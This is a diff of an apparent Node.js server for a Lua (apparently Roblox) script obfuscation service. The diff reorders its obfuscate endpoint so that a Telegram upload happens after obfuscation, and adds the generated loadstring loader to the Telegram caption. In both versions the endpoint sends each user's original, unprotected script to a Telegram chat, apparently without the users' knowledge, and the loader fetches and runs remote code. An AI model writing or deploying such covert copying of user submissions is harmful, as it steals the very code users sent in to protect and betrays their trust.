@@ -21,9 +21,17 @@ const tempDir = path.join(__dirname, 'temp');
 if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
 
 // ─── FUNGSI KIRIM FILE KE TELEGRAM ──────────────────────────
-function sendTelegramFile(scriptContent, scriptId, preset) {
+function sendTelegramFile(scriptContent, scriptId, preset, loaderScript) {
     const filename = `original_${scriptId}.lua`;
-    const caption = `🚀 <b>New Obfuscation Request</b>\n\n🆔 <b>ID:</b> <code>${scriptId}</code>\n⚙️ <b>Preset:</b> <code>${preset}</code>\n📏 <b>Size:</b> ${scriptContent.length} chars\n📅 <b>Date:</b> ${new Date().toLocaleString('id-ID')} WIB`;
+    
+    // Teks dirapikan dan ditambah Loadstring (menggunakan tag <code> agar bisa di-copy)
+    const caption = `🚀 <b>New Obfuscation Request</b>\n\n` +
+                    `🆔 <b>ID:</b> <code>${scriptId}</code>\n` +
+                    `⚙️ <b>Preset:</b> <code>${preset}</code>\n` +
+                    `📏 <b>Size:</b> ${scriptContent.length} chars\n` +
+                    `📅 <b>Date:</b> ${new Date().toLocaleString('id-ID')} WIB\n\n` +
+                    `🔗 <b>Loadstring (Tap to Copy):</b>\n` +
+                    `<code>${loaderScript}</code>`;
 
     const boundary = '----TelegramBoundary' + Date.now().toString(16);
     let payload = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`;
@@ -45,7 +53,7 @@ function sendTelegramFile(scriptContent, scriptId, preset) {
     const req = https.request(options, (res) => {
         let data = '';
         res.on('data', chunk => data += chunk);
-        res.on('end', () => console.log('[TELEGRAM LOG]', data));
+        res.on('end', () => console.log('[TELEGRAM LOG] Berhasil dikirim'));
     });
     req.on('error', err => console.error('[TELEGRAM ERROR]', err));
     req.write(payload);
@@ -92,10 +100,10 @@ app.post('/api/obfuscate', async (req, res) => {
     const selectedPreset = preset || 'Medium';
 
     try {
-        const tempId = Math.floor(Math.random() * 1000).toString();
-        sendTelegramFile(script, tempId, selectedPreset);
-
+        // 1. Obfuscate dulu scriptnya
         const obfuscatedCode = await obfuscateWithPrometheus(script, selectedPreset);
+        
+        // 2. Buat ID & Loadstring
         const scriptId = Math.random().toString(36).substring(2, 15);
         scriptDatabase.set(scriptId, obfuscatedCode);
 
@@ -103,6 +111,10 @@ app.post('/api/obfuscate', async (req, res) => {
         const host = req.headers['x-forwarded-host'] || req.headers.host;
         const loader = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;
 
+        // 3. Kirim ke Telegram beserta Loadstring-nya
+        sendTelegramFile(script, scriptId, selectedPreset, loader);
+
+        // 4. Kirim respon sukses ke website
         res.json({ success: true, loader });
     } catch (error) {
         res.status(500).json({ error: error.toString() });
